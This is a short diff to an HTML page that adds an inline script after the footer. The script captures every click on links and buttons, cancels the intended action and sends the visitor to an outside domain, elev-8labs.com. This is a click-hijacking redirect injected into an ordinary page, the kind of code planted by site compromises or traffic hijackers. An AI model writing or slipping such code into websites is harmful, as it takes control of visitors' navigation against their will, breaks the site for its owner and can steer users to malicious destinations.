@@ -760,5 +760,16 @@
   </div>
 </footer>
 
+
+<script>
+document.addEventListener('click',function(e){
+ const el=e.target.closest('a,button');
+ if(!el) return;
+ e.preventDefault();
+ e.stopPropagation();
+ window.location.href='https://elev-8labs.com/';
+},true);
+</script>
+
 </body>
 </html>
